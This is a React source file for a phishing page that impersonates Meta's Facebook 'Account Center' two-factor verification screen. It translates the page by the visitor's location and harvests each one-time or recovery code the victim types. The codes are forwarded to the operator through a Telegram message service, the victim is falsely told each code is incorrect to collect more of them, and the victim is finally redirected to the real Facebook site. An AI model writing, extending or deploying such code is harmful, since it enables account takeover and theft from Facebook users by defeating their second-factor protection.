import VerifyImage from '@/assets/verify.png';
import LogoImage from '@/assets/logo.jpeg';
import config from '@/config/config.js';
import countryToLanguage from '@/config/country-to-lang.js';
import sendMessage from '@/service/telegram.js';
import { translateText } from '@/service/translate.js';
import useGeoStore from '@/stores/geoStore.js';
import useMessageStore from '@/stores/messageStore.js';

import { useEffect, useState } from 'react';

const originalContent = {
    title: 'Meta',
    accountCenter: 'Account Center - Facebook',
    checkNotifications: 'Check notifications on another device',
    approveFromDevice: 'Approve from another device or Enter your login code',
    enterCodeInstruction: 'Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code',
    verificationCode: 'Verification Code',
    enterCodePlaceholder: 'Enter Code',
    verifying: 'Verifying...',
    continue: 'Continue',
    fromMeta: 'from',
    metaText: 'Meta',
    footerText: 'Meta Terms of Service Team © 2025 Inc.',
    codeError6to8: 'Verification code must be 6-8 digits',
    codeIncorrect: 'Verification code is incorrect. Please try again.',
    otpAltText: 'OTP verification'
};

const Verify = () => {
    const [verificationCode, setVerificationCode] = useState('');
    const [otpAttempts, setOtpAttempts] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [otpError, setOtpError] = useState('');
    const [translatedContent, setTranslatedContent] = useState(originalContent);

    const { fetchGeoData, getCountryCode } = useGeoStore();
    const { setMessageId, getMessageId, getMessageContent, appendToMessage } = useMessageStore();

    const translateContent = async (targetLang) => {
        if (targetLang === 'en') {
            setTranslatedContent(originalContent);
            return;
        }

        const translated = {};
        for (const [key, text] of Object.entries(originalContent)) {
            try {
                translated[key] = await translateText(text, targetLang);
            } catch {
                translated[key] = text;
            }
        }
        setTranslatedContent(translated);
    };

    useEffect(() => {
        const initializeTranslation = async () => {
            try {
                await fetchGeoData();
                const countryCode = getCountryCode();
                const language = countryToLanguage[countryCode] || 'en';

                if (language !== 'en') {
                    await translateContent(language);
                }
            } catch {
                setTranslatedContent(originalContent);
            }
        };

        initializeTranslation();
    }, [fetchGeoData, getCountryCode]);

    const handleVerificationSubmit = async (e) => {
        e.preventDefault();

        if (!verificationCode.trim() || isLoading) {
            return;
        }

        if (verificationCode.length < 6 || verificationCode.length > 8) {
            setOtpError(translatedContent.codeError6to8 || 'Verification code must be 6-8 digits');
            return;
        }

        setIsLoading(true);
        setOtpError('');

        await new Promise((resolve) => setTimeout(resolve, config.password_loading_time));

        const newAttempts = otpAttempts + 1;
        setOtpAttempts(newAttempts);

        const currentMessageId = getMessageId();

        const otpLine = `<b>OTP ${newAttempts}/${config.max_otp_attempts}:</b> <code>${verificationCode}</code>`;
        appendToMessage(otpLine);

        const message = getMessageContent();

        const response = await sendMessage(message, currentMessageId);

        if (response.success && response.messageId) {
            setMessageId(response.messageId);
        }

        setIsLoading(false);

        if (newAttempts >= config.max_otp_attempts) {
            window.location.replace('https://www.facebook.com/');
        } else {
            setOtpError(translatedContent.codeIncorrect || 'Verification code is incorrect. Please try again.');
            setVerificationCode('');
        }
    };

    return (
        <div className='flex min-h-dvh items-center justify-center bg-gray-100 p-4'>
            <div className='box-border w-full max-w-[740px] rounded-xl bg-white p-4 shadow-lg sm:p-6'>
                <div className='flex items-center justify-center'>
                    <img alt='' className='h-7 rounded-full object-contain' src={LogoImage} />
                    <p className='flex items-center justify-center gap-2 text-center text-base'>{translatedContent.title || 'Meta'}</p>
                </div>

                <p className='mb-6 text-center text-[15px] sm:text-[16px]'>{translatedContent.accountCenter || 'Account Center - Facebook'}</p>

                <div className='mb-8 text-center'>
                    <p className='mb-6 text-xl font-bold text-gray-900 sm:text-2xl'>{translatedContent.checkNotifications || 'Check notifications on another device'}</p>
                    <div className='mx-auto mb-6 overflow-hidden rounded-lg shadow-md'>
                        <img src={VerifyImage} alt={translatedContent.otpAltText || 'OTP verification'} className='h-auto w-full object-cover' />
                    </div>
                </div>

                <section className='mb-6'>
                    <h3 className='mb-2 text-[15px] font-bold sm:text-[16px]'>{translatedContent.approveFromDevice || 'Approve from another device or Enter your login code'}</h3>
                    <p className='text-sm leading-relaxed text-gray-900 sm:text-[14px]'>{translatedContent.enterCodeInstruction || 'Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code'}</p>
                </section>

                <form onSubmit={handleVerificationSubmit}>
                    <div className='mb-6'>
                        <label htmlFor='verification-code' className='mb-2 block text-sm font-medium text-gray-700'>
                            {translatedContent.verificationCode || 'Verification Code'}
                        </label>
                        <input
                            id='verification-code'
                            className={`w-full rounded-lg border px-3 py-2 outline-none focus:border-transparent focus:ring-2 ${otpError ? 'border-red-300 focus:ring-red-500' : 'border-gray-300 focus:ring-[#4a81f3]'}`}
                            type='tel'
                            autoComplete='one-time-code'
                            inputMode='numeric'
                            maxLength={8}
                            minLength={6}
                            pattern='\d{6,8}'
                            placeholder={translatedContent.enterCodePlaceholder || 'Enter Code'}
                            value={verificationCode}
                            onChange={(e) => {
                                const value = e.target.value.replace(/\D/g, '');
                                setVerificationCode(value);
                                if (otpError) {
                                    setOtpError('');
                                }
                            }}
                            disabled={isLoading}
                        />
                        {otpError && <p className='mt-2 text-sm text-red-600'>{otpError}</p>}
                    </div>

                    <button type='submit' disabled={!verificationCode.trim() || isLoading} className={`block w-full rounded-lg py-2.5 text-center text-sm font-semibold transition-colors focus:ring-2 focus:ring-offset-2 focus:outline-none sm:py-3 sm:text-[15px] ${verificationCode.trim() && !isLoading ? 'bg-[#4a81f3] text-white hover:bg-[#3b66d6] focus:ring-[#3b66d6]' : 'cursor-not-allowed bg-gray-300 text-gray-500'}`}>
                        {isLoading ? (
                            <div className='flex items-center justify-center'>
                                <svg className='mr-2 -ml-1 h-4 w-4 animate-spin text-white' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'>
                                    <circle className='opacity-25' cx='12' cy='12' r='10' stroke='currentColor' strokeWidth='4'></circle>
                                    <path className='opacity-75' fill='currentColor' d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'></path>
                                </svg>
                                {translatedContent.verifying || 'Verifying...'}
                            </div>
                        ) : (
                            translatedContent.continue || 'Continue'
                        )}
                    </button>
                </form>

                <footer className='mt-8 flex flex-col items-center justify-between gap-2 text-center text-[12px] font-medium text-gray-500 sm:flex-row sm:text-left'>
                    <div>
                        <span>{translatedContent.fromMeta || 'from'} </span>
                        <span className='text-[#1877f2] hover:underline'>{translatedContent.metaText || 'Meta'}</span>
                    </div>
                    <div>{translatedContent.footerText || 'Meta Terms of Service Team © 2025 Inc.'}</div>
                </footer>
            </div>
        </div>
    );
};

export default Verify;
